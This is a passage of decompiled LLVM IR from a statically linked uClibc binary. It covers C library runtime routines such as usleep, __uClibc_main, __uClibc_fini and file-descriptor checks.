  %v0_8060b00 = phi i32 [ 255, %dec_label_pc_8060af1 ], [ 2048, %dec_label_pc_8060aea ], [ 99, %dec_label_pc_8060ae3 ], [ 20, %dec_label_pc_8060adc ], [ -128, %dec_label_pc_8060ad5 ], [ 1024, %dec_label_pc_8060ac9 ], [ 4, %dec_label_pc_8060ac2 ], [ 32, %dec_label_pc_8060abb ], [ 256, %dec_label_pc_8060ab4 ], [ 2147483647, %dec_label_pc_8060aad ], [ 16, %dec_label_pc_8060a9f ], [ 127, %dec_label_pc_8060a98 ], [ 200112, %dec_label_pc_8060aa6 ], [ 9, %dec_label_pc_8060a7d ], [ 65535, %dec_label_pc_8060a73 ], [ -32768, %dec_label_pc_8060a69 ], [ -2147483648, %dec_label_pc_8060a5f ], [ 8, %dec_label_pc_8060a55 ], [ 500, %dec_label_pc_8060a4b ], [ 4096, %dec_label_pc_8060a41 ], [ 16384, %dec_label_pc_8060a37 ], [ 1000, %dec_label_pc_8060a2d ], [ 32768, %dec_label_pc_8060a23 ], [ 6, %dec_label_pc_8060a11 ], [ 65536, %dec_label_pc_80609ff ], [ 100, %dec_label_pc_80609f5 ], [ 131072, %dec_label_pc_80609eb ], [ 1, %dec_label_pc_80609d1 ], [ -1, %dec_label_pc_8060ad0 ], [ 32767, %dec_label_pc_8060af8 ]
  ret i32 %v0_8060b00

; uselistorder directives
  uselistorder i32 16384, { 1, 0, 7, 8, 9, 10, 11, 12, 13, 2, 3, 4, 14, 5, 6 }
  uselistorder i32 (i32)* @__GI_getpagesize, { 4, 2, 1, 0, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 2, 1, 0 }
  uselistorder i32 113, { 2, 0, 1 }
  uselistorder i32 110, { 2, 0, 1, 3 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 99, { 0, 6, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 97, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 76, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 66, { 0, 11, 9, 2, 3, 4, 12, 5, 10, 1, 6, 7, 8 }
  uselistorder i32 65, { 2, 9, 10, 11, 6, 7, 8, 4, 1, 0, 3, 5 }
  uselistorder i32 63, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 58, { 1, 0, 2 }
  uselistorder i32 55, { 0, 2, 1 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 2, 0, 1 }
  uselistorder i32 25, { 3, 4, 5, 6, 7, 0, 2, 8, 9, 10, 1 }
  uselistorder i32 23, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8060afd, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8060ad0, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8060aa6, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8060a23, { 1, 0 }
  uselistorder label %dec_label_pc_8060a11, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 1000000, i32* @ecx, align 4
  %v2_8060b14 = and i64 %arg1, 4294967295
  %v8_8060b14 = udiv i64 %v2_8060b14, 1000000
  %v9_8060b14 = trunc i64 %v8_8060b14 to i32
  store i32 %v9_8060b14, i32* %stack_var_-8, align 4
  %v2_8060b26 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8060b2b = call i32 @nanosleep(i32 %v2_8060b26, i32 0)
  ret i32 %v2_8060b2b

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 (i32, i32)* @nanosleep, { 1, 3, 2, 4, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807d128.765 to i32)
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060b3c = load i32, i32* @ebx, align 4
  store i32 %v0_8060b3c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), i32 0), label %dec_label_pc_8060b50, label %dec_label_pc_8060b5d

dec_label_pc_8060b50:                             ; preds = %entry, %dec_label_pc_8060b50
  %v1_8060b576 = phi i32 [ %v1_8060b57, %dec_label_pc_8060b50 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8060b57.767 to i32), i32* %stack_var_-16, align 4
  %v5_8060b50 = mul i32 %v1_8060b576, 4
  %v6_8060b50 = add i32 %v5_8060b50, ptrtoint (i32* @global_var_806f848.766 to i32)
  %v7_8060b50 = inttoptr i32 %v6_8060b50 to i32*
  %v8_8060b50 = load i32, i32* %v7_8060b50, align 4
  call void @__pseudo_call(i32 %v8_8060b50)
  %v0_8060b57.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060b57 = add i32 %v0_8060b57.pre, -1
  store i32 %v1_8060b57, i32* %ebx.global-to-local, align 4
  %v10_8060b58 = icmp eq i32 %v0_8060b57.pre, 0
  %v1_8060b5b = icmp eq i1 %v10_8060b58, false
  br i1 %v1_8060b5b, label %dec_label_pc_8060b50, label %dec_label_pc_8060b5d

dec_label_pc_8060b5d:                             ; preds = %dec_label_pc_8060b50, %entry
  %v0_8060b5d = load i32, i32* @global_var_807d138.768, align 8
  %v1_8060b62 = icmp eq i32 %v0_8060b5d, 0
  br i1 %v1_8060b62, label %dec_label_pc_8060b68, label %dec_label_pc_8060b66

dec_label_pc_8060b66:                             ; preds = %dec_label_pc_8060b5d
  %v0_8060b66 = load i32, i32* %stack_var_-16, align 4
  %v1_8060b66 = call i32 @unknown_0(i32 %v0_8060b66)
  br label %dec_label_pc_8060b68

dec_label_pc_8060b68:                             ; preds = %dec_label_pc_8060b66, %dec_label_pc_8060b5d
  %v0_8060b68 = load i32, i32* @global_var_807d13c.769, align 4
  %v1_8060b6e = icmp eq i32 %v0_8060b68, 0
  br i1 %v1_8060b6e, label %dec_label_pc_8060b77, label %dec_label_pc_8060b72

dec_label_pc_8060b72:                             ; preds = %dec_label_pc_8060b68
  %v2_8060b74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060b74, i32* %ebx.global-to-local, align 4
  %v0_8060b75 = load i32, i32* %stack_var_-16, align 4
  %v1_8060b75 = call i32 @unknown_0(i32 %v0_8060b75)
  br label %dec_label_pc_8060b77

dec_label_pc_8060b77:                             ; preds = %dec_label_pc_8060b68, %dec_label_pc_8060b72
  %v2_8060b77 = load i32, i32* %stack_var_-16, align 4
  %v2_8060b78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060b78, i32* @edx, align 4
  ret i32 %v2_8060b77

; uselistorder directives
  uselistorder i32 %v1_8060b57, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8060b77, { 1, 0 }
  uselistorder label %dec_label_pc_8060b50, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_8060b7e = load i32, i32* @eax, align 4
  ret i32 %v0_8060b7e
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8060b7f = load i32, i32* @esi, align 4
  %v0_8060b80 = load i32, i32* @ebx, align 4
  store i32 %v0_8060b80, i32* %stack_var_-8, align 4
  %v0_8060b84 = load i32, i32* @eax, align 4
  store i32 %v0_8060b84, i32* @esi, align 4
  %v0_8060b86 = load i32, i32* @edx, align 4
  store i32 %v0_8060b86, i32* @ebx, align 4
  %v4_8060b8b = call i32 @__libc_fcntl(i32 %v0_8060b84, i32 1, i32 %tmp6)
  %v1_8060b93 = add i32 %v4_8060b8b, 1
  %v8_8060b93 = icmp eq i32 %v1_8060b93, 0
  %v1_8060b94 = icmp eq i1 %v8_8060b93, false
  br i1 %v1_8060b94, label %dec_label_pc_8060baf, label %dec_label_pc_8060b96

dec_label_pc_8060b96:                             ; preds = %entry
  %v0_8060b98 = load i32, i32* @ebx, align 4
  %v4_8060b9e = trunc i32 %v0_8060b98 to i8
  %v5_8060b9e = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_806da60.770 to i32), i8 %v4_8060b9e, i32 %v1_8060b93)
  %v1_8060ba6 = load i32, i32* @esi, align 4
  %v12_8060ba6 = icmp eq i32 %v5_8060b9e, %v1_8060ba6
  br i1 %v12_8060ba6, label %dec_label_pc_8060baf, label %dec_label_pc_8060baa

dec_label_pc_8060baa:                             ; preds = %dec_label_pc_8060b96
  %v0_8060baa = call i32 @abort()
  br label %dec_label_pc_8060baf

dec_label_pc_8060baf:                             ; preds = %dec_label_pc_8060b96, %entry, %dec_label_pc_8060baa
  %v2_8060baf = load i32, i32* %stack_var_-12, align 4
  %v2_8060bb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060bb0, i32* @ebx, align 4
  store i32 %v0_8060b7f, i32* @esi, align 4
  ret i32 %v2_8060baf

; uselistorder directives
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8060baf, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8060bb6 = load i8, i8* @global_var_807d140.771, align 64
  %v1_8060bb6 = icmp eq i8 %v0_8060bb6, 0
  %v1_8060bbd = icmp eq i1 %v1_8060bb6, false
  br i1 %v1_8060bbd, label %entry.dec_label_pc_8060bef_crit_edge, label %dec_label_pc_8060bbf

entry.dec_label_pc_8060bef_crit_edge:             ; preds = %entry
  %v0_8060bf2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8060bef

dec_label_pc_8060bbf:                             ; preds = %entry
  store i8 1, i8* @global_var_807d140.771, align 64
  store i32 4096, i32* @global_var_807d134.638, align 4
  %v0_8060bd9 = call i32 @__pthread_initialize_minimal()
  %v0_8060bea = call i32 @_stdio_init()
  br label %dec_label_pc_8060bef

dec_label_pc_8060bef:                             ; preds = %entry.dec_label_pc_8060bef_crit_edge, %dec_label_pc_8060bbf
  %v0_8060bf2 = phi i32 [ %v0_8060bf2.pre, %entry.dec_label_pc_8060bef_crit_edge ], [ %v0_8060bea, %dec_label_pc_8060bbf ]
  ret i32 %v0_8060bf2

; uselistorder directives
  uselistorder i8* @global_var_807d140.771, { 1, 0 }
  uselistorder label %dec_label_pc_8060bef, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_8060bf3 = load i32, i32* @ebp, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_807d12c.772, align 4
  store i32 %arg6, i32* @global_var_807d13c.769, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_8060c2a = mul i32 %arg2, 4
  %v3_8060c2a = add i32 %tmp31, %v2_8060c2a
  %v1_8060c2d = add i32 %v3_8060c2a, 4
  store i32 %v1_8060c2d, i32* %eax.global-to-local, align 4
  store i32 %v1_8060c2d, i32* @global_var_807d130.763, align 16
  %v3_8060c35 = load i32, i32* %arg3, align 4
  %v14_8060c35 = icmp eq i32 %v1_8060c2d, %v3_8060c35
  %v1_8060c37 = icmp eq i1 %v14_8060c35, false
  br i1 %v1_8060c37, label %dec_label_pc_8060c3f, label %dec_label_pc_8060c39

dec_label_pc_8060c39:                             ; preds = %entry
  store i32 %v3_8060c2a, i32* @global_var_807d130.763, align 16
  br label %dec_label_pc_8060c3f

dec_label_pc_8060c3f:                             ; preds = %entry, %dec_label_pc_8060c39
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8060c44 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8060c44, i32* %eax.global-to-local, align 4
  %v3_8060c49 = bitcast i32* %stack_var_-136 to i8*
  %v4_8060c49 = call i32 @__GI_memset(i8* %v3_8060c49, i32 0, i32 120)
  %v0_8060c4e = load i32, i32* @global_var_807d130.763, align 16
  store i32 %v0_8060c4e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060c56

dec_label_pc_8060c56:                             ; preds = %dec_label_pc_8060c56, %dec_label_pc_8060c3f
  %v0_8060c56 = phi i32 [ %v1_8060c59, %dec_label_pc_8060c56 ], [ %v0_8060c4e, %dec_label_pc_8060c3f ]
  %v1_8060c56 = inttoptr i32 %v0_8060c56 to i32*
  %v2_8060c56 = load i32, i32* %v1_8060c56, align 4
  %v3_8060c56 = icmp eq i32 %v2_8060c56, 0
  %v1_8060c59 = add i32 %v0_8060c56, 4
  store i32 %v1_8060c59, i32* %eax.global-to-local, align 4
  %v1_8060c5c = icmp eq i1 %v3_8060c56, false
  br i1 %v1_8060c5c, label %dec_label_pc_8060c56, label %dec_label_pc_8060c7d.preheader

dec_label_pc_8060c7d.preheader:                   ; preds = %dec_label_pc_8060c56
  store i32 %v1_8060c59, i32* @ebx, align 4
  %v1_8060c7d1 = inttoptr i32 %v1_8060c59 to i32*
  %v2_8060c7d2 = load i32, i32* %v1_8060c7d1, align 4
  %v3_8060c7d3 = icmp eq i32 %v2_8060c7d2, 0
  %v1_8060c8010 = icmp eq i1 %v3_8060c7d3, false
  br i1 %v1_8060c8010, label %dec_label_pc_8060c62.lr.ph, label %dec_label_pc_8060c82

dec_label_pc_8060c62.lr.ph:                       ; preds = %dec_label_pc_8060c7d.preheader
  %v3_8060c42 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8060c6d = add i32 %v3_8060c42, 32
  br label %dec_label_pc_8060c62

dec_label_pc_8060c62:                             ; preds = %dec_label_pc_8060c62.lr.ph, %dec_label_pc_8060c7a
  %v1_8060c6d = phi i32 [ %v2_8060c7d2, %dec_label_pc_8060c62.lr.ph ], [ %v2_8060c7d, %dec_label_pc_8060c7a ]
  %v0_8060c6c = phi i32 [ %v1_8060c59, %dec_label_pc_8060c62.lr.ph ], [ %v1_8060c7a, %dec_label_pc_8060c7a ]
  store i32 %v1_8060c6d, i32* %eax.global-to-local, align 4
  %v6_8060c67 = icmp ugt i32 %v1_8060c6d, 14
  br i1 %v6_8060c67, label %dec_label_pc_8060c7a, label %dec_label_pc_8060c69

dec_label_pc_8060c69:                             ; preds = %dec_label_pc_8060c62
  store i32 %v0_8060c6c, i32* %stack_var_-168, align 4
  %v2_8060c6d = mul i32 %v1_8060c6d, 8
  %v4_8060c6d = add i32 %v3_8060c6d, %v2_8060c6d
  store i32 %v4_8060c6d, i32* %eax.global-to-local, align 4
  %v3_8060c72 = inttoptr i32 %v4_8060c6d to i16*
  %v4_8060c72 = call i32 @memcpy(i16* %v3_8060c72, i32 %v0_8060c6c, i32 8)
  store i32 %v4_8060c72, i32* %eax.global-to-local, align 4
  %v0_8060c7a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8060c7a

dec_label_pc_8060c7a:                             ; preds = %dec_label_pc_8060c62, %dec_label_pc_8060c69
  %v0_8060c7a = phi i32 [ %v0_8060c6c, %dec_label_pc_8060c62 ], [ %v0_8060c7a.pre, %dec_label_pc_8060c69 ]
  %v1_8060c7a = add i32 %v0_8060c7a, 8
  store i32 %v1_8060c7a, i32* @ebx, align 4
  %v1_8060c7d = inttoptr i32 %v1_8060c7a to i32*
  %v2_8060c7d = load i32, i32* %v1_8060c7d, align 4
  %v3_8060c7d = icmp eq i32 %v2_8060c7d, 0
  %v1_8060c80 = icmp eq i1 %v3_8060c7d, false
  br i1 %v1_8060c80, label %dec_label_pc_8060c62, label %dec_label_pc_8060c82

dec_label_pc_8060c82:                             ; preds = %dec_label_pc_8060c7a, %dec_label_pc_8060c7d.preheader
  store i32 %v2_8060c44, i32* @eax, align 4
  %v0_8060c86 = call i32 @_dl_aux_init()
  store i32 %v0_8060c86, i32* @eax, align 4
  %v0_8060c8b = call i32 @__GI___uClibc_init()
  %v1_8060c94 = icmp eq i32 %tmp26, 0
  %v1_8060c96 = icmp eq i1 %v1_8060c94, false
  br i1 %v1_8060c96, label %dec_label_pc_8060c9c, label %dec_label_pc_8060c98

dec_label_pc_8060c98:                             ; preds = %dec_label_pc_8060c82
  %v1_8060c98 = and i32 %tmp26, -65536
  %v2_8060c98 = or i32 %v1_8060c98, 4096
  br label %dec_label_pc_8060c9c

dec_label_pc_8060c9c:                             ; preds = %dec_label_pc_8060c82, %dec_label_pc_8060c98
  %storemerge = phi i32 [ %v2_8060c98, %dec_label_pc_8060c98 ], [ %tmp26, %dec_label_pc_8060c82 ]
  %v0_8060c9c = phi i32 [ %v2_8060c98, %dec_label_pc_8060c98 ], [ %tmp26, %dec_label_pc_8060c82 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8060c9c, i32* @global_var_807d134.638, align 4
  %v13_8060ca1 = icmp eq i32 %tmp25, -1
  %v1_8060ca6 = icmp eq i1 %v13_8060ca1, false
  br i1 %v1_8060ca6, label %dec_label_pc_8060cd1, label %dec_label_pc_8060ca8

dec_label_pc_8060ca8:                             ; preds = %dec_label_pc_8060c9c
  %v0_8060ca8 = call i32 @getuid()
  store i32 %v0_8060ca8, i32* %eax.global-to-local, align 4
  store i32 %v0_8060ca8, i32* @ebx, align 4
  %v0_8060caf = call i32 @geteuid()
  store i32 %v0_8060caf, i32* %eax.global-to-local, align 4
  %v0_8060cb4 = load i32, i32* @ebx, align 4
  %v12_8060cb4 = icmp eq i32 %v0_8060cb4, %v0_8060caf
  %v1_8060cb6 = icmp eq i1 %v12_8060cb4, false
  br i1 %v1_8060cb6, label %dec_label_pc_8060ce7, label %dec_label_pc_8060cb8

dec_label_pc_8060cb8:                             ; preds = %dec_label_pc_8060ca8
  %v0_8060cb8 = call i32 @getgid()
  store i32 %v0_8060cb8, i32* %eax.global-to-local, align 4
  store i32 %v0_8060cb8, i32* @ebx, align 4
  %v0_8060cbf = call i32 @getegid()
  store i32 %v0_8060cbf, i32* %eax.global-to-local, align 4
  %v0_8060cc4 = load i32, i32* @ebx, align 4
  %v12_8060cc4 = icmp eq i32 %v0_8060cc4, %v0_8060cbf
  %v1_8060cc6 = icmp eq i1 %v12_8060cc4, false
  br i1 %v1_8060cc6, label %dec_label_pc_8060ce7, label %dec_label_pc_8060cc8.thread

dec_label_pc_8060cc8.thread:                      ; preds = %dec_label_pc_8060cb8
  br label %dec_label_pc_8060d11

dec_label_pc_8060cd1:                             ; preds = %dec_label_pc_8060c9c
  store i32 %tmp25, i32* %eax.global-to-local, align 4
  %v15_8060cd1 = icmp eq i32 %tmp25, %tmp24
  %v1_8060cd5 = icmp eq i1 %v15_8060cd1, false
  br i1 %v1_8060cd5, label %dec_label_pc_8060ce7, label %dec_label_pc_8060cd7

dec_label_pc_8060cd7:                             ; preds = %dec_label_pc_8060cd1
  br label %dec_label_pc_8060ce7

dec_label_pc_8060ce7:                             ; preds = %dec_label_pc_8060cd7, %dec_label_pc_8060cd1, %dec_label_pc_8060cb8, %dec_label_pc_8060ca8
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8060cee = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8060cfd = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8060d0c = call i32 @__check_one_fd()
  br label %dec_label_pc_8060d11

dec_label_pc_8060d11:                             ; preds = %dec_label_pc_8060cc8.thread, %dec_label_pc_8060ce7
  %storemerge53 = phi i32 [ %tmp25, %dec_label_pc_8060cc8.thread ], [ %v0_8060d0c, %dec_label_pc_8060ce7 ]
  store i32 %storemerge53, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32* %esi.global-to-local, align 4
  %v0_8060d16 = load i32, i32* @edi, align 4
  %v1_8060d16 = inttoptr i32 %v0_8060d16 to i32*
  %v2_8060d16 = load i32, i32* %v1_8060d16, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32* %esi.global-to-local, align 4
  store i32 %v2_8060d16, i32* inttoptr (i32 134695000 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 4), i32* %esi.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_807d138.768, align 8
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674501), i32 6), label %dec_label_pc_8060d36, label %dec_label_pc_8060d42

dec_label_pc_8060d36:                             ; preds = %dec_label_pc_8060d11, %dec_label_pc_8060d36
  %v4_8060d3651 = phi i32 [ %v1_8060d3d, %dec_label_pc_8060d36 ], [ 0, %dec_label_pc_8060d11 ]
  %v5_8060d36 = mul i32 %v4_8060d3651, 4
  %v6_8060d36 = add i32 %v5_8060d36, ptrtoint (i32* @global_var_806f848.766 to i32)
  %v7_8060d36 = inttoptr i32 %v6_8060d36 to i32*
  %v8_8060d36 = load i32, i32* %v7_8060d36, align 4
  call void @__pseudo_call(i32 %v8_8060d36)
  %v0_8060d3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060d3d = add i32 %v0_8060d3d, 1
  store i32 %v1_8060d3d, i32* %ebx.global-to-local, align 4
  %v1_8060d3e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8060d3e = icmp ult i32 %v1_8060d3d, %v1_8060d3e.pre
  br i1 %v7_8060d3e, label %dec_label_pc_8060d36, label %dec_label_pc_8060d42

dec_label_pc_8060d42:                             ; preds = %dec_label_pc_8060d36, %dec_label_pc_8060d11
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), i32 0), label %dec_label_pc_8060d5a, label %dec_label_pc_8060d66

dec_label_pc_8060d5a:                             ; preds = %dec_label_pc_8060d42, %dec_label_pc_8060d5a
  %v4_8060d5a45 = phi i32 [ %v1_8060d61, %dec_label_pc_8060d5a ], [ 0, %dec_label_pc_8060d42 ]
  store i32 ptrtoint (i32* @global_var_8060d61.775 to i32), i32* %stack_var_-168, align 4
  %v5_8060d5a = mul i32 %v4_8060d5a45, 4
  %v6_8060d5a = add i32 %v5_8060d5a, ptrtoint (i32* @global_var_806f848.766 to i32)
  %v7_8060d5a = inttoptr i32 %v6_8060d5a to i32*
  %v8_8060d5a = load i32, i32* %v7_8060d5a, align 4
  call void @__pseudo_call(i32 %v8_8060d5a)
  %v0_8060d61 = load i32, i32* @ebx, align 4
  %v1_8060d61 = add i32 %v0_8060d61, 1
  store i32 %v1_8060d61, i32* @ebx, align 4
  %v1_8060d62.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8060d62 = icmp ult i32 %v1_8060d61, %v1_8060d62.pre
  br i1 %v7_8060d62, label %dec_label_pc_8060d5a, label %dec_label_pc_8060d66

dec_label_pc_8060d66:                             ; preds = %dec_label_pc_8060d5a, %dec_label_pc_8060d42
  store i32 134570858, i32* %eax.global-to-local, align 4
  %v0_8060d6f = load i32, i32* %stack_var_-168, align 4
  %v1_8060d6f = call i32 @__errno_location(i32 %v0_8060d6f)
  %v1_8060d74 = inttoptr i32 %v1_8060d6f to i32*
  store i32 0, i32* %v1_8060d74, align 4
  store i32 134570843, i32* %eax.global-to-local, align 4
  %v0_8060d83 = call i32 @__h_errno_location()
  store i32 %v0_8060d83, i32* %eax.global-to-local, align 4
  %v1_8060d88 = inttoptr i32 %v0_8060d83 to i32*
  store i32 0, i32* %v1_8060d88, align 4
  %v0_8060d8f = load i32, i32* @global_var_807d130.763, align 16
  store i32 %v0_8060d8f, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8060bf3)
  %v0_8060da4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060da7 = call i32 @__GI_exit(i32 %v0_8060da4)
  store i32 %v1_8060da7, i32* %eax.global-to-local, align 4
  ret i32 %v1_8060da7

; uselistorder directives
  uselistorder i32 %v1_8060d61, { 1, 2, 0 }
  uselistorder i32 %v1_8060d3d, { 1, 2, 0 }
  uselistorder i32 %v2_8060c7d, { 1, 0 }
  uselistorder i32 %v1_8060c7a, { 2, 1, 0 }
  uselistorder i32 %v1_8060c6d, { 0, 2, 1 }
  uselistorder i32 %v1_8060c59, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_8060c56, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %tmp25, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 5, 6, 4, 7, 8, 0, 2, 15, 9, 11, 10, 1, 12, 13, 14, 16, 17, 18, 19 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806f848.766 to i32), i32 -134674504), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_806f848.766 to i32), { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8060d5a, { 1, 0 }
  uselistorder label %dec_label_pc_8060d36, { 1, 0 }
  uselistorder label %dec_label_pc_8060d11, { 1, 0 }
  uselistorder label %dec_label_pc_8060c9c, { 1, 0 }
  uselistorder label %dec_label_pc_8060c7a, { 1, 0 }
  uselistorder label %dec_label_pc_8060c62, { 1, 0 }
  uselistorder label %dec_label_pc_8060c3f, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_8060dd5:
  %v4_8060dc1 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_807d160.776 to i32), i32 134587095, i32 134587095)
  ret i32 %v4_8060dc1
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8060dd9 = load i32, i32* @ebx, align 4
  %v1_8060deb = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060deb, i32* @ebx, align 4
  %v1_8060dfc = icmp eq i32 %v1_8060deb, 0
  %v1_8060dfe = icmp eq i1 %v1_8060dfc, false
  br i1 %v1_8060dfe, label %dec_label_pc_8060eb4, label %dec_label_pc_8060e04

dec_label_pc_8060e04:                             ; preds = %entry
  %v5_8060e19 = call i32 @pthread_once(i32* nonnull @global_var_807d144.778, i32 134614444, i32 134586504, i32 134586504)
  %v1_8060e49 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8060e49, i32* @ebx, align 4
  %v1_8060e5a = icmp eq i32 %v1_8060e49, 0
  %v1_8060e5c = icmp eq i1 %v1_8060e5a, false
  br i1 %v1_8060e5c, label %dec_label_pc_8060eb4, label %dec_label_pc_8060e5e

dec_label_pc_8060e5e:                             ; preds = %dec_label_pc_8060e04
  %v5_8060e67 = call i32 @calloc(i64 1, i32 200, i32 %v1_8060e49, i32 %v1_8060e49)
  store i32 %v5_8060e67, i32* %ebx.global-to-local, align 4
  %v1_8060e71 = icmp eq i32 %v5_8060e67, 0
